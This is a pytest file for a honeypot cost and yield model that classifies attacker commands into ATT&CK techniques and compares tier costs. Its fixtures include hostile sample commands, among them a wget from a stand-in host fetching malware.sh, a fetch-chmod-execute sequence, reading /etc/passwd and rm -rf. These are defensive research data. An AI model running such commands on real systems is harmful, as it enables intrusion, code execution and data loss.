"""
Tests for Cost Model and Yield Accounting Engine (analysis/cost_model.py).
Pre-registered in SPEC.md Section 9 and EVAL.md Section 6.
"""

from __future__ import annotations

import pytest
from analysis.cost_model import (
    classify_attack_techniques,
    compute_session_yield,
    compute_session_cost,
    evaluate_arm_efficiency,
    run_yield_sensitivity_analysis,
    CostParameters,
    YieldWeights,
)


def test_classify_attack_techniques_known_commands():
    cmds = [
        "uname -a",
        "whoami",
        "ps aux",
        "ls -la",
        "wget http://192.168.1.5/malware.sh",
        "rm -rf /tmp/test",
        "cat /etc/passwd",
    ]
    techniques = classify_attack_techniques(cmds)
    # T1082 (uname), T1033 (whoami, /etc/passwd), T1057 (ps), T1083 (ls), T1105 (wget), T1070.004 (rm)
    assert "T1082" in techniques
    assert "T1033" in techniques
    assert "T1057" in techniques
    assert "T1083" in techniques
    assert "T1105" in techniques
    assert "T1070.004" in techniques
    assert len(techniques) >= 5


def test_classify_attack_techniques_empty_commands():
    assert classify_attack_techniques([]) == set()
    assert classify_attack_techniques(["echo hello", "cd /tmp"]) == set()


def test_compute_session_yield_boundaries():
    # Zero activity: yield = 0
    y_zero = compute_session_yield(d_commands=0, f_files=0, p_pivots=0, k_ttps=0)
    assert y_zero == 0.0

    # Max single session yield with default weights (1.0 each)
    # min(20, 20)/20 = 1, 1[F>=1]=1, 1[P>=1]=1, min(8,8)/8 = 1 => Total = 4.0
    y_max = compute_session_yield(d_commands=50, f_files=5, p_pivots=2, k_ttps=12)
    assert y_max == 4.0

    # Partial activity
    # d=10 => 10/20=0.5; f=1 => 1.0; p=0 => 0.0; k=4 => 4/8=0.5 => Total = 2.0
    y_part = compute_session_yield(d_commands=10, f_files=1, p_pivots=0, k_ttps=4)
    assert pytest.approx(y_part, rel=1e-5) == 2.0


def test_compute_session_yield_custom_weights():
    weights = YieldWeights(w_cmd=2.0, w_file=0.5, w_pivot=1.0, w_ttp=0.5)
    # d=20 (2.0*1.0), f=1 (0.5*1.0), p=0 (0), k=8 (0.5*1.0) => 3.0
    y = compute_session_yield(20, 1, 0, 8, weights=weights)
    assert pytest.approx(y, rel=1e-5) == 3.0


def test_compute_session_cost_tier_ordering():
    cost_t1 = compute_session_cost(tier="T1", duration_seconds=60.0)
    cost_t2 = compute_session_cost(tier="T2", duration_seconds=60.0)
    cost_t3 = compute_session_cost(tier="T3", duration_seconds=60.0)

    # Strictly monotonic cost: T1 < T2 < T3
    assert cost_t1 > 0
    assert cost_t1 < cost_t2 < cost_t3
    # T3 is significantly more expensive than T1 due to VM allocation
    assert cost_t3 >= 5.0 * cost_t1


def test_evaluate_arm_efficiency():
    sessions = [
        {"commands": ["ls", "cat /etc/passwd"], "files": 0, "pivots": 0, "duration": 30.0},
        {"commands": ["wget evil.sh", "chmod +x evil.sh", "./evil.sh"], "files": 1, "pivots": 0, "duration": 90.0},
        {"commands": [], "files": 0, "pivots": 0, "duration": 5.0},
    ]

    # Arm A (Static T1): all sessions get T1
    arm_a = evaluate_arm_efficiency(sessions, arm_policy=lambda s: "T1")
    assert arm_a["tier_counts"]["T1"] == 3
    assert arm_a["tier_counts"]["T2"] == 0
    assert arm_a["tier_counts"]["T3"] == 0
    assert arm_a["total_cost"] > 0
    assert arm_a["yield_per_rupee"] > 0

    # Arm C (Static T3): all sessions get T3
    arm_c = evaluate_arm_efficiency(sessions, arm_policy=lambda s: "T3")
    assert arm_c["tier_counts"]["T3"] == 3
    assert arm_c["total_cost"] > arm_a["total_cost"]


def test_run_yield_sensitivity_analysis():
    sessions = [
        {"commands": ["ls", "pwd"], "files": 0, "pivots": 0, "duration": 10.0},
        {"commands": ["wget malware", "rm malware"], "files": 1, "pivots": 1, "duration": 60.0},
        {"commands": ["uname -a", "id", "ps", "netstat", "w"], "files": 0, "pivots": 0, "duration": 40.0},
    ]
    results = run_yield_sensitivity_analysis(sessions, n_trials=20, seed=123)
    assert "mean_yield" in results
    assert "std_yield" in results
    assert "trials" in results
    assert len(results["trials"]) == 20
    assert results["mean_yield"] > 0
